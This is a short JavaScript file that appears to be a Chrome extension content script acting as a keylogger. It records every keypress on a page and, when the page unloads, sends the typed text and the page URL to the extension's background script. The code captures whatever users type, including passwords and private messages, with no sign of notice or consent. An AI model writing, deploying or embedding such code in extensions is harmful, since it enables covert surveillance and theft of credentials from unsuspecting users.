var word = "";
var letter = "";

// Listen to any, "keypress" event.
addEventListener('keypress', function(event) {

	word += event.key;


	// if the key pressed is a, "space character" start a new word.
	if (event.code == "Space") {
		word += " ";
	}
});

// update the log after window has been closed.
window.onbeforeunload = function() {

	sendMessage(document.location.href, word);  
}

// sends a mesage to the background script.
function sendMessage(location, log) {
	chrome.runtime.sendMessage({
		text: log,
		url: location
	});
};

// sets the variables, 'word' and 'letter' to the empty string.
function reset() {
	letter = "";
}